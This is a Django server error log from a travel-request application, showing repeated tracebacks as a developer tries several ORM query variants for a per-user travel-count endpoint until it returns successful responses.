-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 1008, in annotate
-    clone.query.add_annotation(annotation, alias, is_summary=False)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 988, in add_annotation
-    summarize=is_summary)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/aggregates.py", line 39, in resolve_expression
-    c = super().resolve_expression(query, allow_joins, reuse, summarize)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/expressions.py", line 597, in resolve_expression
-    c.source_expressions[pos] = arg.resolve_expression(query, allow_joins, reuse, summarize, for_save)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/expressions.py", line 509, in resolve_expression
-    return query.resolve_ref(self.name, allow_joins, reuse, summarize)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1570, in resolve_ref
-    join_info = self.setup_joins(field_list, self.get_meta(), self.get_initial_alias(), can_reuse=reuse)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1473, in setup_joins
-    names[:pivot], opts, allow_many, fail_on_missing=True,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
-    "Choices are: %s" % (name, ", ".join(available)))
-django.core.exceptions.FieldError: Cannot resolve keyword 'nitesh001' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-ERROR|16/Mar/2021 17:33:03|basehttp|20474|139626560571136|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 500 23103
-ERROR|16/Mar/2021 17:34:42|log|20556|139799458166528|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.values('created_by').annotate(total=Count(emp_code))
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 1008, in annotate
-    clone.query.add_annotation(annotation, alias, is_summary=False)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 988, in add_annotation
-    summarize=is_summary)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/aggregates.py", line 39, in resolve_expression
-    c = super().resolve_expression(query, allow_joins, reuse, summarize)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/expressions.py", line 597, in resolve_expression
-    c.source_expressions[pos] = arg.resolve_expression(query, allow_joins, reuse, summarize, for_save)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/expressions.py", line 509, in resolve_expression
-    return query.resolve_ref(self.name, allow_joins, reuse, summarize)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1570, in resolve_ref
-    join_info = self.setup_joins(field_list, self.get_meta(), self.get_initial_alias(), can_reuse=reuse)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1473, in setup_joins
-    names[:pivot], opts, allow_many, fail_on_missing=True,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
-    "Choices are: %s" % (name, ", ".join(available)))
-django.core.exceptions.FieldError: Cannot resolve keyword 'nitesh001' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-ERROR|16/Mar/2021 17:34:42|basehttp|20556|139799458166528|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 500 23103
-ERROR|16/Mar/2021 17:35:42|log|20556|139799458166528|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.values('created_by').annotate(total=Count(emp_code))
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 1008, in annotate
-    clone.query.add_annotation(annotation, alias, is_summary=False)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 988, in add_annotation
-    summarize=is_summary)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/aggregates.py", line 39, in resolve_expression
-    c = super().resolve_expression(query, allow_joins, reuse, summarize)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/expressions.py", line 597, in resolve_expression
-    c.source_expressions[pos] = arg.resolve_expression(query, allow_joins, reuse, summarize, for_save)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/expressions.py", line 509, in resolve_expression
-    return query.resolve_ref(self.name, allow_joins, reuse, summarize)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1570, in resolve_ref
-    join_info = self.setup_joins(field_list, self.get_meta(), self.get_initial_alias(), can_reuse=reuse)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1473, in setup_joins
-    names[:pivot], opts, allow_many, fail_on_missing=True,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
-    "Choices are: %s" % (name, ", ".join(available)))
-django.core.exceptions.FieldError: Cannot resolve keyword 'nitesh001' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-ERROR|16/Mar/2021 17:35:42|basehttp|20556|139799458166528|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 500 23103
-ERROR|16/Mar/2021 17:58:34|log|21585|140234741032704|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.filter(created_by__name=emp_code).count()
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
-    return getattr(self.get_queryset(), name)(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 844, in filter
-    return self._filter_or_exclude(False, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 862, in _filter_or_exclude
-    clone.query.add_q(Q(*args, **kwargs))
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1263, in add_q
-    clause, _ = self._add_q(q_object, self.used_aliases)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1287, in _add_q
-    split_subq=split_subq,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1225, in build_filter
-    condition = self.build_lookup(lookups, col, value)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1090, in build_lookup
-    lhs = self.try_transform(lhs, lookup_name)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1126, in try_transform
-    (name, lhs.output_field.__class__.__name__))
-django.core.exceptions.FieldError: Unsupported lookup 'name' for CharField or join on the field not permitted.
-ERROR|16/Mar/2021 17:58:34|basehttp|21585|140234741032704|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 500 21055
-ERROR|16/Mar/2021 17:59:06|log|21635|140048876652288|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3209, in get
-    serializer = Travel_RequestSerializers(a1.data, many=True)
-AttributeError: 'int' object has no attribute 'data'
-ERROR|16/Mar/2021 17:59:06|basehttp|21635|140048876652288|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 500 19483
-ERROR|16/Mar/2021 17:59:35|log|21671|140680053384960|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3210, in get
-    dict = {'massage': 'data found', 'status': True, 'data': serializer.data}
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/serializers.py", line 745, in data
-    ret = super().data
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/serializers.py", line 246, in data
-    self._data = self.to_representation(self.instance)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/serializers.py", line 664, in to_representation
-    self.child.to_representation(item) for item in iterable
-TypeError: 'int' object is not iterable
-ERROR|16/Mar/2021 17:59:35|basehttp|21671|140680053384960|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 500 20013
-INFO|16/Mar/2021 18:00:01|basehttp|21707|140083680290560|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 200 873
-INFO|16/Mar/2021 18:00:38|basehttp|21757|139925093607168|"GET /get_travel_count_user/?emp_code=nitesh001 HTTP/1.1" 200 47
-INFO|16/Mar/2021 18:01:13|basehttp|21757|139925093607168|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 200 48
-ERROR|16/Mar/2021 18:05:04|log|21994|140162148022016|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1735, in add_fields
-    join_info = self.setup_joins(name.split(LOOKUP_SEP), opts, alias, allow_many=allow_m2m)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1473, in setup_joins
-    names[:pivot], opts, allow_many, fail_on_missing=True,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
-    "Choices are: %s" % (name, ", ".join(available)))
-django.core.exceptions.FieldError: Cannot resolve keyword '2' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.values('2').filter(created_by=emp_code).annotate(total=Count('2'))
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
-    return getattr(self.get_queryset(), name)(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 750, in values
-    clone = self._values(*fields, **expressions)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 745, in _values
-    clone.query.set_values(fields)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1987, in set_values
-    self.add_fields(field_names, True)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1758, in add_fields
-    "Choices are: %s" % (name, ", ".join(names)))
-django.core.exceptions.FieldError: Cannot resolve keyword '2' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-ERROR|16/Mar/2021 18:05:04|basehttp|21994|140162148022016|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 500 23944
-ERROR|16/Mar/2021 18:06:56|log|22085|140055176492800|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1735, in add_fields
-    join_info = self.setup_joins(name.split(LOOKUP_SEP), opts, alias, allow_many=allow_m2m)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1473, in setup_joins
-    names[:pivot], opts, allow_many, fail_on_missing=True,
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1389, in names_to_path
-    "Choices are: %s" % (name, ", ".join(available)))
-django.core.exceptions.FieldError: Cannot resolve keyword 'div944' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.values(emp_code).filter(created_by=emp_code).annotate(total=Count('2'))
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/manager.py", line 82, in manager_method
-    return getattr(self.get_queryset(), name)(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 750, in values
-    clone = self._values(*fields, **expressions)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 745, in _values
-    clone.query.set_values(fields)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1987, in set_values
-    self.add_fields(field_names, True)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/sql/query.py", line 1758, in add_fields
-    "Choices are: %s" % (name, ", ".join(names)))
-django.core.exceptions.FieldError: Cannot resolve keyword 'div944' into field. Choices are: approval_level, assignment_travel_request_status, assignment_travel_tax_grid, business_lead, client_executive_lead, column1, column10, column11, column12, column2, column3, column4, column5, column6, column7, column8, column9, created_by, current_ticket_owner, date_created, date_modified, emp_email, emp_email_id, expence_cureency, expence_departureDate, expence_estimatedCost, expence_fromCountry, expence_returnDate, expence_toCountry, expense_approver, have_laptop, home_contact_name, home_phone_ext, home_phone_number, id, is_billable, is_laptop_required, is_travel_multi_city, is_travel_multi_country, modified_by, organization, organization_id, policy_violations, project, project_id, project_manager, project_name, remark, request_notes, status, supervisor, travel_req_id, travel_req_status, travel_req_status_notes, travel_request_action_history, travel_request_dependent, travel_request_details
-ERROR|16/Mar/2021 18:06:56|basehttp|22085|140055176492800|"GET /get_travel_count_user/?emp_code=div944 HTTP/1.1" 500 23964
-ERROR|16/Mar/2021 18:07:47|log|22139|140377456060160|Internal Server Error: /get_travel_count_user/
-Traceback (most recent call last):
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/exception.py", line 34, in inner
-    response = get_response(request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 126, in _get_response
-    response = self.process_exception_by_middleware(e, request)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/core/handlers/base.py", line 124, in _get_response
-    response = wrapped_callback(request, *callback_args, **callback_kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
-    return view_func(*args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/views/generic/base.py", line 68, in view
-    return self.dispatch(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 509, in dispatch
-    response = self.handle_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 469, in handle_exception
-    self.raise_uncaught_exception(exc)
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 480, in raise_uncaught_exception
-    raise exc
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/rest_framework/views.py", line 506, in dispatch
-    response = handler(request, *args, **kwargs)
-  File "/media/tspl26/D/raju_python/mobility_env/mobilitysqr_live/mobility_apps/travel/views.py", line 3208, in get
-    a1 = Travel_Request.objects.values('created_by').filter(created_by=emp_code).annotate(total=Count('2'))
-  File "/media/tspl26/D/raju_python/mobility_env/lib/python3.7/site-packages/django/db/models/query.py", line 1008, in annotate
